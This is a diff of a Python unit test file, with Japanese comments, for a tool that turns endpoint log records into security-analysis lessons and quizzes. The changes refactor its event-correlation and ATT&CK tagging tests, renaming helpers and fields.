         store, events, cands = self._events(com="WS99")
-        self.assertEqual([e["_keys"] for e in events], [{"WS99"}, {"WS99"}])
+        self.assertEqual([e.correlation_keys for e in events],
+                         [frozenset({"WS99"}), frozenset({"WS99"})])
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
         self.assertEqual(quiz["correlation"]["hostKey"], "WS99")
@@ -1342,7 +1380,7 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
             itm2("10/05/2022 10:00:10.000 +0900", "WS99", evt="file",
                  sub="create", path="C:\\Users\\test\\a.dat"),
         ])
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-dedup")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-dedup")
         self.assertIsNotNone(lesson)
         corr = [q for s in lesson["stages"] for q in s["quizzes"]
                 if q["category"] == "correlation"]
@@ -1358,12 +1396,12 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
             for i in range(5)
         ])
         store = evidence.EvidenceStore()
-        records = explain.parse_itm2(text, name=ENDPOINT)
+        records = parse_itm2(text, name=ENDPOINT)
         self.assertEqual(len(records), 5)
-        self.assertEqual(len(explain.events_from_itm2(records, store)), 1,
+        self.assertEqual(len(explain.display_events(records, store)), 1,
                          "一覧の間引きが効いていない")
         # 相関の候補は間引かない。
-        self.assertEqual(len(explain._correlation_candidates(records)), 5)
+        self.assertEqual(len(explain.correlation_candidates(records)), 5)
 
     def test_a_pair_beyond_the_stage_cap_is_still_found(self):
         """`STAGE_EVENTS` 件を越えた先にある組も見つかること。"""
@@ -1377,7 +1415,7 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
                           psPath="C:\\Windows\\System32\\late.exe"))
         lines.append(itm2("10/05/2022 09:30:15.000 +0900", "WS99", evt="file",
                           sub="create", path="C:\\Users\\test\\late.dat"))
-        lesson = explain.build_lesson("t", {ENDPOINT: "\n".join(lines)}, "gen-cap")
+        lesson = build_lesson("t", {ENDPOINT: "\n".join(lines)}, "gen-cap")
         stage = next(s for s in lesson["stages"] if s["id"] == "endpoint")
         self.assertLessEqual(len(stage["events"]), explain.STAGE_EVENTS,
                              "前提が崩れている: 一覧が切られていない")
@@ -1396,7 +1434,7 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
             itm2("10/05/2022 10:00:10.000 +0900", "WS99", evt="file",
                  sub="create", path="C:\\Users\\test\\a.dat"),
         ])
-        lesson = explain.build_lesson("t", {ENDPOINT: text}, "gen-dedup2")
+        lesson = build_lesson("t", {ENDPOINT: text}, "gen-dedup2")
         stage = next(s for s in lesson["stages"] if s["id"] == "correlate")
         shown = {i for e in stage["events"] for i in e.get("evidenceIds", [])}
         for q in stage["quizzes"]:
@@ -1422,8 +1460,8 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
             else:
                 lines.append(itm2(ts, "WS99",
                                   psPath=f"C:\\Windows\\System32\\p{i}.exe"))
-        cands = explain._correlation_candidates(
-            explain.parse_itm2("\n".join(lines), name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2("\n".join(lines), name=ENDPOINT)
         )
         self.assertEqual(len(cands), n)
         return cands
@@ -1478,8 +1516,8 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
         for label, spacing in self.SHAPES[1:]:
             with self.subTest(shape=label):
                 cands = self._candidates(2000, spacing)
-                span = (max(c.stamp.sort for c in cands)
-                        - min(c.stamp.sort for c in cands))
+                span = (max(c.timestamp.sort for c in cands)
+                        - min(c.timestamp.sort for c in cands))
                 self.assertLessEqual(span, 60.0,
                                      f"{label}: 全体で {span} 秒に広がっている")
 
@@ -1504,8 +1542,8 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
                  sub="create", path="C:\\Users\\test\\later.dat"),
         ])
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
@@ -1524,8 +1562,8 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
                  psPath="C:\\Windows\\System32\\cmd.exe"),
         ])
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(
-            explain.parse_itm2(text, name=ENDPOINT)
+        cands = explain.correlation_candidates(
+            parse_itm2(text, name=ENDPOINT)
         )
         quiz, why, _ = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
@@ -1543,20 +1581,20 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
             best = None
             for i, a in enumerate(cands):
                 for b in cands[i + 1:]:
-                    first, other = (a, b) if a.stamp.sort < b.stamp.sort else (b, a)
-                    gap = other.stamp.sort - first.stamp.sort
+                    first, other = (a, b) if a.timestamp.sort < b.timestamp.sort else (b, a)
+                    gap = other.timestamp.sort - first.timestamp.sort
                     if gap <= 0 or gap > window:
                         continue
                     if frozenset({first.kind, other.kind}) not in \
                             explain.CORRELATION_PAIRS:
                         continue
-                    if not (first.keys & other.keys):
+                    if not (first.correlation_keys & other.correlation_keys):
                         continue
-                    if first.stamp.basis != other.stamp.basis:
+                    if first.timestamp.basis != other.timestamp.basis:
                         continue
                     if explain._place(first) == explain._place(other):
                         continue
-                    key = (gap, first.stamp.sort,
+                    key = (gap, first.timestamp.sort,
                            explain._place(first), explain._place(other))
                     if best is None or key < best:
                         best = key
@@ -1584,8 +1622,8 @@ class TestCorrelationSearchesEveryEvent(unittest.TestCase):
                 else:
                     lines.append(itm2(ts, host, evt="reg", sub="setVal",
                                       path=f"HKCU\\k{i}", ip=ip))
-            cands = explain._correlation_candidates(
-                explain.parse_itm2("\n".join(lines), name=ENDPOINT)
+            cands = explain.correlation_candidates(
+                parse_itm2("\n".join(lines), name=ENDPOINT)
             )
             window = rng.choice([60.0, 10.0, 300.0])
             with self.subTest(trial=trial):
@@ -1603,9 +1641,9 @@ class TestDiscoveryIsAnAllowList(unittest.TestCase):
     """
 
     def _tag(self, cmd):
-        needs, rule = explain._PROCESS_ATTCK["net.exe"]
+        needs, rule = attck.PROCESS_RULES["net.exe"]
         self.assertTrue(needs)
-        return rule(explain._tokens(cmd))
+        return rule(attck.tokens(cmd))
 
     #: 仕様にある変更系スイッチ。どれか一つでも付いたら列挙とは言えない。
     MODIFYING = [
@@ -1667,7 +1705,7 @@ class TestResizeShadowstorageIsNeverTagged(unittest.TestCase):
     """
 
     def _tag(self, cmd):
-        return explain._PROCESS_ATTCK["vssadmin.exe"][1](explain._tokens(cmd))
+        return attck.PROCESS_RULES["vssadmin.exe"][1](attck.tokens(cmd))
 
     def test_no_size_is_ever_read_as_inhibiting_recovery(self):
         for size in ("100GB", "20GB", "5%", "unbounded", "1MB", "900GB"):
@@ -1696,7 +1734,7 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
     """
 
     def _records(self, n):
-        return explain.parse_itm2("\n".join(
+        return parse_itm2("\n".join(
             itm2(f"10/05/2022 {9 + i // 3600:02d}:{i // 60 % 60:02d}:"
                  f"{i % 60:02d}.000 +0900", "WS99",
                  psPath=f"C:\\Windows\\System32\\p{i % 40}.exe",
@@ -1705,13 +1743,13 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
 
     def test_candidates_do_not_touch_the_evidence_store(self):
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(self._records(500))
+        cands = explain.correlation_candidates(self._records(500))
         self.assertEqual(len(cands), 500)
         self.assertEqual(len(store.items), 0)
 
     def test_only_the_chosen_pair_is_registered(self):
         store = evidence.EvidenceStore()
-        records = explain.parse_itm2("\n".join([
+        records = parse_itm2("\n".join([
             itm2("10/05/2022 09:00:00.000 +0900", "WS99",
                  psPath="C:\\Windows\\System32\\cmd.exe"),
             itm2("10/05/2022 09:00:20.000 +0900", "WS99", evt="file",
@@ -1721,7 +1759,7 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
                  psPath=f"C:\\Windows\\System32\\other{i}.exe")
             for i in range(300)
         ]), name=ENDPOINT)
-        cands = explain._correlation_candidates(records)
+        cands = explain.correlation_candidates(records)
         self.assertEqual(len(cands), 302)
         quiz, why, pair = explain._correlation_quiz(store, cands, "q")
         self.assertIsNotNone(quiz, why)
@@ -1740,7 +1778,7 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
         tracemalloc.start()
         before = tracemalloc.get_traced_memory()[0]
         store = evidence.EvidenceStore()
-        cands = explain._correlation_candidates(records)
+        cands = explain.correlation_candidates(records)
         explain._correlation_quiz(store, cands, "q")
         peak = tracemalloc.get_traced_memory()[1]
         tracemalloc.stop()
@@ -1770,19 +1808,19 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
                  psPath=f"C:\\Windows\\System32\\p{i % 20}.exe")
             for i in range(2000)
         ]
-        real = explain._event_for
+        real = explain._lesson_event
         calls = []
 
-        def counted(kind, rec, store):
-            calls.append(kind)
-            return real(kind, rec, store)
+        def counted(nev, store, readers=None):
+            calls.append(nev.kind)
+            return real(nev, store, readers)
 
-        explain._event_for = counted
+        explain._lesson_event = counted
         try:
-            lesson = explain.build_lesson(
+            lesson = build_lesson(
                 "t", {ENDPOINT: "\n".join(lines)}, "gen-count")
         finally:
-            explain._event_for = real
+            explain._lesson_event = real
         self.assertIsNotNone(lesson)
         # 作ってよいのは、間引いたあとの一覧と、相関に採用した 2 件だけ。
         # 一覧は起動 21 種（cmd.exe と p0〜p19）とファイル 1 件で 22。
@@ -1794,12 +1832,12 @@ class TestCorrelationDoesNotMaterialiseEveryRecord(unittest.TestCase):
 
     def test_host_key_sets_are_shared_between_records(self):
         """端末キーの集合を行ごとに作らない。ログに出る端末は数台しかない。"""
-        cands = explain._correlation_candidates(self._records(500))
-        self.assertEqual(len({id(c.keys) for c in cands}), 1)
+        cands = explain.correlation_candidates(self._records(500))
+        self.assertEqual(len({id(c.correlation_keys) for c in cands}), 1)
 
     def test_candidates_reference_the_parsed_record_without_copying(self):
         records = self._records(50)
-        cands = explain._correlation_candidates(records)
+        cands = explain.correlation_candidates(records)
         by_id = {id(r) for r in records}
         for c in cands:
-            self.assertIn(id(c.rec), by_id, "レコードを複製している")
+            self.assertIn(id(c), by_id, "レコードを複製している")
